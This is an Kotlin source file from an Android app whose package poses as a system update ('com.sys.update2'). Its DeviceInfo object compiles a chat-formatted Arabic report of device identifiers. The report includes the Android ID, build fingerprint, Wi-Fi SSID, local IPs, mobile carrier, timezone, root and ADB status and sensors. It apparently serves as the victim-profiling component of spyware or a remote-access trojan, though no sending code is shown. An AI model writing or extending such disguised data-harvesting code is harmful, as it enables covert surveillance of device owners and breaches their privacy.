package com.sys.update2

import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.Sensor
import android.hardware.SensorManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.DisplayMetrics
import android.view.WindowManager
import java.net.NetworkInterface
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.TimeZone

object DeviceInfo {

    fun getFullInfo(ctx: Context): String {
        val sb = StringBuilder()
        sb.append("📱 *معلومات الجهاز*\n")
        sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")

        // الجهاز
        sb.append("🔷 *الجهاز*\n")
        sb.append("🏭 الشركة: `${Build.MANUFACTURER}`\n")
        sb.append("📱 الموديل: `${Build.MODEL}`\n")
        sb.append("📦 المنتج: `${Build.PRODUCT}`\n")
        sb.append("🎯 اللوحة: `${Build.BOARD}`\n")
        sb.append("🏷 العلامة: `${Build.BRAND}`\n\n")

        // Android
        sb.append("🤖 *Android*\n")
        sb.append("📌 الإصدار: `${Build.VERSION.RELEASE}`\n")
        sb.append("🔢 API: `${Build.VERSION.SDK_INT}`\n")
        sb.append("🔨 Build: `${Build.ID}`\n")
        sb.append("🔐 Security Patch: `${Build.VERSION.SECURITY_PATCH}`\n\n")

        // CPU
        sb.append("🧠 *المعالج*\n")
        sb.append("🔩 ABI: `${Build.SUPPORTED_ABIS.joinToString()}`\n")
        sb.append("⚙ الأنوية: `${Runtime.getRuntime().availableProcessors()}`\n\n")

        // RAM
        try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val mi = ActivityManager.MemoryInfo()
            am.getMemoryInfo(mi)
            val totalMB = mi.totalMem / (1024 * 1024)
            val availMB = mi.availMem / (1024 * 1024)
            sb.append("💠 *RAM*\n")
            sb.append("📊 الكلي: `$totalMB MB`\n")
            sb.append("✅ المتاح: `$availMB MB`\n\n")
        } catch (_: Exception) {}

        // التخزين
        try {
            val stat = StatFs(Environment.getDataDirectory().path)
            val totalGB = (stat.blockCountLong * stat.blockSizeLong) / (1024L * 1024 * 1024)
            val freeGB = (stat.availableBlocksLong * stat.blockSizeLong) / (1024L * 1024 * 1024)
            sb.append("💾 *التخزين*\n")
            sb.append("📊 الكلي: `${totalGB} GB`\n")
            sb.append("✅ المتاح: `${freeGB} GB`\n\n")
        } catch (_: Exception) {}

        // البطارية
        try {
            val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            val intent = ctx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            val temp = (intent?.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0

            sb.append("🔋 *البطارية*\n")
            sb.append("📊 النسبة: `$level%`\n")
            sb.append("🌡 الحرارة: `${temp}°C`\n\n")
        } catch (_: Exception) {}

        // الشاشة
        try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as WindowManager
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            wm.defaultDisplay.getRealMetrics(metrics)
            sb.append("🖥 *الشاشة*\n")
            sb.append("📐 الدقة: `${metrics.widthPixels} x ${metrics.heightPixels}`\n")
            sb.append("📏 الكثافة: `${metrics.densityDpi} dpi`\n\n")
        } catch (_: Exception) {}

        // الشبكة
        try {
            val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            val net = cm.activeNetwork
            val caps = cm.getNetworkCapabilities(net)
            val type = when {
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) == true -> "Wi-Fi"
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true -> "بيانات الجوال"
                caps?.hasTransport(NetworkCapabilities.TRANSPORT_VPN) == true -> "VPN"
                else -> "غير معروف"
            }
            sb.append("🌐 *الشبكة*\n")
            sb.append("📶 النوع: `$type`\n")

            val wifi = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            val info = wifi.connectionInfo
            if (info != null) {
                @Suppress("DEPRECATION")
                val ssid = info.ssid?.replace("\"", "") ?: ""
                @Suppress("DEPRECATION")
                val ip = info.ipAddress
                if (ssid.isNotBlank() && ssid != "<unknown ssid>") sb.append("🛜 SSID: `$ssid`\n")
                if (ip != 0) sb.append("💻 IP: `${intToIp(ip)}`\n")
            }
        } catch (_: Exception) {}

        // IP محلية
        try {
            val ips = mutableListOf<String>()
            NetworkInterface.getNetworkInterfaces()?.toList()?.forEach { ni ->
                ni.inetAddresses?.toList()?.forEach { addr ->
                    if (!addr.isLoopbackAddress && addr.hostAddress?.contains(":") == false) {
                        ips.add("${ni.name}: ${addr.hostAddress}")
                    }
                }
            }
            if (ips.isNotEmpty()) {
                sb.append("🔗 *IPs المحلية*\n")
                ips.take(4).forEach { sb.append("   • `$it`\n") }
            }
        } catch (_: Exception) {}

        // المشغّل
        try {
            val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            @Suppress("DEPRECATION")
            val carrier = tm.networkOperatorName ?: ""
            if (carrier.isNotBlank()) sb.append("📞 المشغّل: `$carrier`\n")
        } catch (_: Exception) {}
        sb.append("\n")

        // المعرّفات
        sb.append("🆔 *المعرّفات*\n")
        try {
            val androidId = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID)
            sb.append("🆔 Android ID: `$androidId`\n")
        } catch (_: Exception) {}
        sb.append("🔢 Fingerprint:\n`${Build.FINGERPRINT}`\n\n")

        // المنطقة
        sb.append("🌍 *المنطقة*\n")
        sb.append("🗣 اللغة: `${Locale.getDefault().language}`\n")
        sb.append("🌐 البلد: `${Locale.getDefault().country}`\n")
        sb.append("🕐 المنطقة الزمنية: `${TimeZone.getDefault().id}`\n")
        sb.append("⏰ الوقت: `${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())}`\n\n")

        // الحماية
        sb.append("🔐 *الحماية*\n")
        try {
            val root = isRooted()
            sb.append("🔓 Root: `${if (root) "نعم ⚠" else "لا"}`\n")
            val debug = Settings.Global.getInt(ctx.contentResolver, Settings.Global.ADB_ENABLED, 0) == 1
            sb.append("🐞 ADB: `${if (debug) "مفعّل" else "معطّل"}`\n")
        } catch (_: Exception) {}

        // الحساسات
        try {
            val sm = ctx.getSystemService(Context.SENSOR_SERVICE) as SensorManager
            val list = sm.getSensorList(Sensor.TYPE_ALL)
            sb.append("\n🎛 *الحساسات* (${list.size})\n")
            list.take(10).forEach { sb.append("   • ${it.name}\n") }
        } catch (_: Exception) {}

        return sb.toString()
    }

    fun getQuickInfo(ctx: Context): String {
        return "${Build.MANUFACTURER} ${Build.MODEL} — Android ${Build.VERSION.RELEASE}"
    }

    private fun intToIp(ip: Int): String =
        "${ip and 0xff}.${ip shr 8 and 0xff}.${ip shr 16 and 0xff}.${ip shr 24 and 0xff}"

    private fun isRooted(): Boolean {
        val paths = arrayOf(
            "/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
            "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su", "/data/local/su", "/su/bin/su"
        )
        return paths.any { try { java.io.File(it).exists() } catch (_: Exception) { false } }
    }
}
